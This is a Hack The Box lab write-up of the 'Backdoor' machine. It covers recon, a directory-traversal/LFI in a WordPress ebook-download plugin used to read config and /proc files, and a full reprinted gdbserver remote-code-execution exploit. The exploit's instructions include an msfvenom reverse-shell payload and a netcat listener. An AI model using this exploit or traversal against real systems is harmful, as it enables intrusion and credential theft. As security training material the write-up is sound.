---
layout: single
title: HTB - Backdoor
excerpt: "Backdoor is a machine that has linux OS with easy level of difficulty both in terms of intrusion and privilege escalation. on the port 80 runs wordpress which is vulnerable to local file inclusion and also the machine is vulnerable to remote command execution."
date: 2021-11-30
classes: wide
header:
  teaser: /assets/images/img-backdoor/portada.png
  teaser_home_page: true
  icon: /assets/images/img-backdoor/
categories:
  - CTF
  - Pentest
  - web pentesting
tags:
  - Hack the box
  - wordpress 
  - reverse shell
  - lfi 
---

Backdoor is a machine that has linux OS with easy level of difficulty both in terms of intrusion and privilege escalation. on the port 80 runs wordpress which is vulnerable to local file inclusion and also the machine is vulnerable to remote command execution.

<p align = "center">
<img src = "/assets/images/img-backdoor/portada.png">
</p>

Machine matrix:

<p align = "center">
<img src = "/assets/images/img-backdoor/nivel.png">
</p>

First I will create a directory with the name of the machine, and with ***mkt*** I will create the following directories to be able to move better the content of each one of those directories.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura1.png">
</p>

mkt is a function that i have defined in the ***~/.zshrc*** so that I can create these directories without creating them one by one.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura2.png">
</p>

## Recognition

We send one icmp trace to the victim machine, and we can see that we have sent a packet and received that packet back. and through the TTL I know that I am on a linux machine. since linux machines have ttl 64 and windows machines have ttl 128. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura3.png">
</p>

If you asking why when I receive the packet the ttl shows 63 instead of 64? this is because when we send icmp traces to the machine it goes through a series of intermediary nodes and this causes the ttl to decrease by one digit or unit whatever you want to call it. we can see this if we do a traceroute with the ***-R*** parameter.

<p align = "center">
<img src = "/assets/images/img-backdoor/trace.png">
</p>

Anyway i have a tool on my system called ***wichsystem*** that tells you if the machine is linux or windows through the ttl.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura4.png">
</p>

And this is the python script of the function wichsystem.

```python
#!/usr/bin/python3
#coding: utf-8
 
import re, sys, subprocess
 
# python3 wichSystem.py YOURIP 
 
if len(sys.argv) != 2:
    print("\n[!] Uso: python3 " + sys.argv[0] + " <direccion-ip>\n")
    sys.exit(1)
 
def get_ttl(ip_address):
 
    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
    (out,err) = proc.communicate()
 
    out = out.split()
    out = out[12].decode('utf-8')
 
    ttl_value = re.findall(r"\d{1,3}", out)[0]
 
    return ttl_value
 
def get_os(ttl):
 
    ttl = int(ttl)
 
    if ttl >= 0 and ttl <= 64:
        return "Linux"
    elif ttl >= 65 and ttl <= 128:
        return "Windows"
    else:
        return "Not Found"
 
if __name__ == '__main__':
 
    ip_address = sys.argv[1]
 
    ttl = get_ttl(ip_address)
 
    os_name = get_os(ttl)
    print("\n%s (ttl -> %s): %s\n" % (ip_address, ttl, os_name))

```

## Ports recognition

Now with nmap we are going to do the port recognition and services that run those ports.

First we are going to scan how many open ports this machine has and export it in grepable format to the allports file.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura6.png">
</p>
 
Basically I export it in grepable format because I have a function define in the ~/.zshrc which is the ***extractports*** function, basically it allows me to visualize the ports in a more elegant way and it copies the ports in the clipboard.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura7.png">
</p>

Now let's do another scan to see the versions of the services running on each of these ports.

```
# Nmap 7.91 scan initiated Tue Nov 30 03:14:40 2021 as: nmap -sCV -p22,80,1337 -oN targeted 10.10.11.125
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.058s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 30 03:17:36 2021 -- 1 IP address (1 host up) scanned in 175.66 seconds
```

With the command ***whatweb*** we can make a small recognition of the web, to be able to see the services used by the web.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura8.png">
</p>

Now we access the website to see some information that may be useful to us.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura9.png">
</p>

When I click on the home menu it does not let me access because it does not find the following domain. And this means that virtual hosting is being applied.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura10.png">
</p>

To apply the virtual hosting we have to go to the file ***/etc/hosts*** and we put the ip and the domain.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura11.png">
</p>

Now we can see that the domain is now recognized.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura12.png">
</p>

Now when accessing the home page with the domain there is no difference in the web by putting the domain.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura13.png">
</p>

Now with nmap we are going to do a simple fuzzing to see potential routes. 

```
# Nmap 7.91 scan initiated Tue Nov 23 20:18:33 2021 as: nmap --script http-enum -p80 -oN WebScan 10.129.109.254
Nmap scan report for backdoor.htb (10.129.109.254)
Host is up (0.043s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.8.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

# Nmap done at Tue Nov 23 20:18:47 2021 -- 1 IP address (1 host up) scanned in 13.31 seconds

```

We can see a login page but we don't have credentials at the moment.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura14.png">
</p>


if we go to the blog section of the web page we see that there is a post published by the admin user so I deduce that in this web there is only one user who is the admin.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura15.png">
</p>

With searchspliot tool I tried to search if there is any vulnerability in the version of wordpress that came with this machine, but I did not find anything interesting.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura16.png">
</p>

Now what I did is apply fuzzing with ***wfuzz*** to find potential routes. I know I did fuzzing with nmap but nmap is not as powerful as wfuzz and wfuzz gives us more information.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura17.png">
</p>

Another alternative to the wfuzz tool is ***gobuster*** which is made in go language and as you know go works well with sockets and connections.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura18.png">
</p>

Using wfuzz and gobuster are almost the same routes that i found with nmap only the only interesting route i found is wp-content as it may contain plugins that are installed on this page, and we can find possible vulnerabilities but we will see that below.

What I am going to do is with the tool ***WPscan*** we are going to scan this wordpress page to see if there are more plugins or themes that have installed and the possible vulnerabilities they have.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura19.png">
</p>

This is a wpscan look like:

```
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[32m[+][0m URL: http://10.10.11.125/ [10.10.11.125]
[32m[+][0m Started: Sun Nov 28 03:51:52 2021

Interesting Finding(s):

[32m[+][0m Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[32m[+][0m XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[32m[+][0m WordPress readme found: http://10.10.11.125/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[32m[+][0m WordPress theme in use: twentyseventeen
 | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus on business sites, it features multiple sections on the front page as well as widgets, navigation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our default theme for 2017 works great in many languages, for any abilities, and on any device.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready, block-patterns
 | Text Domain: twentyseventeen
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'


[34m[i][0m No plugins Found.

[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[32m[+][0m Finished: Sun Nov 28 03:51:56 2021
[32m[+][0m Requests Done: 2
[32m[+][0m Cached Requests: 34
[32m[+][0m Data Sent: 606 B
[32m[+][0m Data Received: 1.027 KB
[32m[+][0m Memory used: 239.539 MB
[32m[+][0m Elapsed time: 00:00:04
```
With the wpscan scan I did not find relevant information about the plugins that this page has. I could have done a more aggressive scan using the command ***wpscan --url http: //backdoor.htb --plugins-detection aggressive*** but the scan would take a long time. 

So what I did is to go in the path ***wp-content/plugins*** and I found a plugin that is installed.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura20.png">
</p>

## Exploitation phase 

When I opened the folder of this plugin I found the file "readme.txt" and that is where I could see the version of this plugin.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura21.png">
</p>
 
Then with searchsploit we search if that have any exploit, and I found one specifically about the version that have installed in the wordpress and it is also a very critical one that is "Directory traversal".

<p align = "center">
<img src = "/assets/images/img-backdoor/captura22.png">
</p>

Open the exploit and we can see that there is a specific path that is vulnerable to directory traversal.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura23.png">
</p>

When I go to the path I installed the wordpress configuration file which is ***wp-config.php*** and we can see that we have a username and password for the database and more information about the server.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura24.png">
</p>

What I did is to try in the login page with admin user to see if the password that was in the configuration file was valid also to access with the admin account and the password didt'nt work.

So what I did is to save the database credentials in a file.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura25.png">
</p>

Then what I did is try using the traversal dirictory to see if it would let me view the file ***/etc/passwd*** to see the users that exist on the victim machine. and we see that it works and there is a user named ***user***.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura26.png">
</p>

Then I tried to test if it would let me view the content of the directory "/user/home/.ssh/id_rsa" to see if it has the id_rsa key and so I could access via ssh on port 22, but it would not let me view anything.

Then I remembered that port 1337 was open but at the time of the port scan I could not see which service was running, so to find out which service is running on port 1337 we can use lfi.

using burpsuite we are going to use it as a proxy to intercept the request and sent it in the ***intruder*** to manipulate it and send it to the server. and here what we are going to do is use lfi through the path ***/proc***, basically this path contains information about the processes that are running on the system. and we are going to use the path ***/proc / pid / cmdline*** that contains commands to start processes. here the ***pid*** will be a variable number

<p align = "center">
<img src = "/assets/images/img-backdoor/captura27.png">
</p>

And in the payload section we will specify that the type of payload will be ***numeric ***. and in ***payload option*** I will specify that it generates the number of payloads in the range 900-1000. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura28.png">
</p>

This process we can do it to with wfuzz with the command: 

```
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

We click ***attack*** to start the process. and in the response part we can see the processes that it is executing in the command part in the system. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura29.png">
</p>

And boom!!! i found it in the port 1337 its running gdbserver that is a linux debugger. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura30.png">
</p>

Using searchsploit, I wanted to find out if there was any gdbserver exploit, but fortunately I didn't find anything. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura31.png">
</p>

Then searching in google i found an gdbserver exploit that allows me to RCE witch is a python script.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura32.png">
</p>

So this is the script:

```python
# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
# Date: 2021-11-21
# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
# Vendor Homepage: https://www.gnu.org/software/gdb/
# Software Link: https://www.gnu.org/software/gdb/download/
# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)

#!/usr/bin/env python3


import binascii
import socket
import struct
import sys

help = f'''
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
'''


def checksum(s: str) -> str:
    res = sum(map(ord, s)) % 256
    return f'{res:2x}'


def ack(sock):
    sock.send(b'+')


def send(sock, s: str) -> str:
    sock.send(f'${s}#{checksum(s)}'.encode())
    res = sock.recv(1024)
    ack(sock)
    return res.decode()


def exploit(sock, payload: str):
    send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')
    send(sock, '!')

    try:
        res = send(sock, 'vCont;s')
        data = res.split(';')[2]
        arch, pc = data.split(':')
    except Exception:
        print('[!] ERROR: Unexpected response. Try again later')
        exit(1)

    if arch == '10':
        print('[+] Found x64 arch')
        pc = binascii.unhexlify(pc[:pc.index('0*')])
        pc += b'\0' * (8 - len(pc))
        addr = hex(struct.unpack('<Q', pc)[0])[2:]
        addr = '0' * (16 - len(addr)) + addr
    elif arch == '08':
        print('[+] Found x86 arch')
        pc = binascii.unhexlify(pc)
        pc += b'\0' * (4 - len(pc))
        addr = hex(struct.unpack('<I', pc)[0])[2:]
        addr = '0' * (8 - len(addr)) + addr

    hex_length = hex(len(payload))[2:]

    print('[+] Sending payload')
    send(sock, f'M{addr},{hex_length}:{payload}')
    send(sock, 'vCont;c')


def main():
    if len(sys.argv) < 3:
        print(help)
        exit(1)

    ip, port = sys.argv[1].split(':')
    file = sys.argv[2]

    try:
        with open(file, 'rb') as f:
            payload = f.read().hex()
    except FileNotFoundError:
        print(f'[!] ERROR: File {file} not found')
        exit(1)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, int(port)))
        print('[+] Connected to target. Preparing exploit')
        exploit(sock, payload)
        print('[*] Pwned!! Check your listener')


if __name__ == '__main__':
    main()

```
Inside the script it tells us the instructions that we must follow, first it tells us to generate a payload with ***msfvenom***. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura33.png">
</p>

Then with netcat we ara going to listen on the port 4444 and then execute the exploit specifying the victim machine ip and the payload that we generate with msfvenom.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura34.png">
</p>

And as we can see we have a connection and we are as the user ***user***, and we are going to indicate that we want a pseudo console. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura35.png">
</p>

If we want another way to report a pseudo console we can do it using python. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura38.png">
</p>

## Privilege escalation 

And with this command I want the remote shell to be the size of my terminal and that it can do ctrl + c and not get out of the session. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura36.png">
</p>

let's export two environment variables.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura37.png">
</p>

And i found the first flag. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura39.png">
</p>

Ok now i need to access as root for this i am going to test if it works for me with the *** screen *** command. and if it lets me login as root. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura40.png">
</p>

And we can see tha second flag to submit in the htb.

<p align = "center">
<img src = "/assets/images/img-backdoor/captura41.png">
</p>

And with the credentials of the database that we had saved we can use it to access in the database. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura42.png">
</p>

We can see the databases that are created.  

<p align = "center">
<img src = "/assets/images/img-backdoor/captura43.png">
</p>

We can access the wordpress database and here we can enter the ***wp-users*** table to see the users and passwords. 

<p align = "center">
<img src = "/assets/images/img-backdoor/captura44.png">
</p>
